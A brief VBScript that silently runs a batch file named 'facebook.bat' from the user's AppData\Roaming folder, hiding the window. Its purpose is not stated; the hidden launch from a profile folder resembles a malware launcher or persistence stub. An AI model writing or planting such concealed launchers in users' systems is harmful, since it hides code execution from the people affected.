Set WshShell = CreateObject("WScript.Shell") 
WshShell.CurrentDirectory="C:\Users\%username%\AppData\Roaming\"

WshShell.Run chr(34) & "C:\Users\%username%\AppData\Roaming\facebook.bat" & Chr(34), 0
Set WshShell = Nothing 


